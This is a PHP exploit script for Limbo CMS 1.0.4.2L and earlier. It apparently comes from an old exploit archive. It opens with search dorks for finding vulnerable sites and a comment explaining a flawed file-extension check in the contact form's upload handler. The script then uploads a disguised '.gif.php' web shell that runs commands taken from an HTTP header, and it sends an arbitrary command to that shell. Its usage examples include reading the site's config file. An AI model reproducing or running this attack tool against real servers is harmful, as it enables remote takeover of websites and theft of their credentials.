#!/usr/bin/php -q -d short_open_tag=on
&lt;?
print_r(&#039;
-----------------------------------------------------------------------------
Limbo &lt;= 1.0.4.2L &quot;com_contact&quot; remote commands execution exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dorks: inurl:contact inurl:Itemid inurl:option attachment &quot;Enter your name:&quot;
       intext:&quot;site powered by limbo&quot;
-----------------------------------------------------------------------------
&#039;);
if ($argc&lt;3) {
print_r(&#039;
-----------------------------------------------------------------------------
Usage: php &#039;.$argv[0].&#039; host path itemid cmd OPTIONS
host:      target server (ip/hostname)
path:      path to Limbo
itemid:    a number, check [*] or [**]
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php &#039;.$argv[0].&#039; 2.2.2.2 /limbo/ 43 ls -la -P1.1.1.1:80
php &#039;.$argv[0].&#039; 1.1.1.1 / 3 cat ./../../config.php -p81
-----------------------------------------------------------------------------
&#039;);
die;
}
/*
explaination:
there are some upload scripts in default installation, check:

[*]  http://target/path_to_limbo/index.php?Itemid=43&amp;option=contact
[**] http://target/path_to_limbo/index.php?Itemid=3&amp;option=contact

and there is a vulnerable function in /components/com_contact/contact.html.php near lines 69-73:

...
function file_ext($file)
{
  $ext = explode(&quot;.&quot;, $file);
  return strtolower($ext[1]); //[!!!!!!] &lt;-------------------------------------------
}
...

now look at /components/com_contact/contact.php
...
switch ( $task )
{
case &quot;post&quot;:
        {
        $abs_dir = $lm_absolute_path.&quot;images/contact/&quot;;
        $web_dir = $lm_website.&quot;images/contact/&quot;;
        if (!is_dir($abs_dir)) mkdir($abs_dir);
        $valid_ext = array(
                &quot;jpg&quot;,
                &quot;png&quot;,
                &quot;gif&quot;,
                &quot;doc&quot;,
                &quot;xls&quot;
                );

        if ($_FILES[&#039;contact_attach&#039;][&#039;name&#039;]!=&quot;&quot;)
        {
            $tmp_name = $_FILES[&#039;contact_attach&#039;][&#039;tmp_name&#039;];
            $name = $_FILES[&#039;contact_attach&#039;][&#039;name&#039;];
            $ext = file_ext($name); // [!] &lt;-----------------------------------
            if(!in_array($ext,$valid_ext)) // [!!] &lt;-----------------------------------
                { ?&gt;
                    &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;
                     alert(&quot;&lt;?php echo _MESSAGE_ATTACH_INVALID; ?&gt;&quot;);
                     window.history.go(-1);
                     &lt;/script&gt;
                     &lt;?php
                }else{
             @move_uploaded_file($tmp_name, $abs_dir.$name); // [!!!!] &lt;-----------------------------------
             $contact_text.=&quot; (&quot;._MESSAGE_ATTACH.$web_dir.$name.&quot;)&quot;;
             }
        }
...

but what happen if the attachment filename is like suntzu.gif.php ?

You can upload arbitrary php code, then u launch commands:

http://[target]/[path]/images/contact/suntzu.gif.php?cmd=ls%20-la

*/
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

$host=$argv[1];
$path=$argv[2];
$itemid=$argv[3];
$cmd=&quot;&quot;;
$port=80;
$proxy=&quot;&quot;;
for ($i=4; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

$data=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;contact_name\&quot;;\r\n\r\n&quot;;
$data.=&quot;suntzu\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;contact_email\&quot;;\r\n\r\n&quot;;
$data.=&quot;suntzu@suntzu.org\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;contact_subject\&quot;;\r\n\r\n&quot;;
$data.=&quot;hereitissuntzu\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;contact_text\&quot;;\r\n\r\n&quot;;
$data.=&quot;ohshit\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;task\&quot;;\r\n\r\n&quot;;
$data.=&quot;post\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;send\&quot;;\r\n\r\n&quot;;
$data.=&quot;Send\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;contact_attach\&quot;; filename=\&quot;suntzu.gif.php\&quot;;\r\n&quot;;
$data.=&quot;Content-Type: image/gif;\r\n\r\n&quot;;
$data.=&quot;&lt;?php set_time_limit(0); echo &#039;my_delim&#039;;passthru(\$_SERVER[&#039;HTTP_SUNTZU&#039;]);die;?&gt;\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a--\r\n&quot;;
$packet =&quot;POST &quot;.$p.&quot;index.php?option=contact&amp;Itemid=$itemid HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Accept: text/plain\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);

$packet =&quot;GET &quot;.$p.&quot;images/contact/suntzu.gif.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;SUNTZU: &quot;.$cmd.&quot;\r\n&quot;;
$packet.=&quot;Accept: text/plain\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;my_delim&quot;))
{
echo &quot;exploit succeeded ...\r\n&quot;;
$temp=explode(&quot;my_delim&quot;,$html);
die($temp[1]);
}
//if you are here...
echo &quot;exploit failed ...\r\n&quot;;
?&gt;

# milw0rm.com [2006-09-15]
